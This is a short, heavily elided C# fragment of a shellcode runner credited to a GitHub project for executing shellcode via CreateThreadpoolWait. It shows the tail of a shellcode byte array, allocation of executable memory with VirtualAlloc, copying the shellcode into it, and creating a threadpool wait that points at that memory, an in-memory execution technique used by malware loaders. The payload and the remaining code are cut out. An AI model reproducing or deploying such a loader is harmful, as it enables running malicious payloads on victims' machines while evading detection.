...
// original code - https://github.com/Kara-4search/CreateThreadpoolWait_ShellcodeExecution_CSharp

namespace CreateThreadpoolWait_Runner
{
...
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
            ...
            IntPtr Buf1_address = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            
            Marshal.Copy(shellcode, 0, (Buf1_address), shellcode.Length);

            IntPtr TP_WAIT_pointer = CreateThreadpoolWait(Buf1_address, 0, 0);
